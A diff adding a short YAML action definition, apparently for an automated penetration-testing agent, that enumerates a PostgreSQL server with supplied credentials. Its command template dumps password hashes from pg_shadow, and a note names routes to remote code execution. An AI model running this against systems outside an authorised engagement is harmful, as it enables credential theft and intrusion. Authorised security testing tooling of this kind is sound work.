@@ -1,0 +1,17 @@
+name: postgres_enum
+category: services
+description: PostgreSQL enumeration and exploitation
+preconditions:
+  - service.port==5432
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "psql -h {target_ip} -U {username} -c '\l; SELECT * FROM pg_shadow;'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 120
+model_tier: haiku
+mechanism: "PostgreSQL: \l for databases, \dt for tables, pg_shadow for hashes. RCE: COPY TO PROGRAM, large object functions, or UDF via C extension."
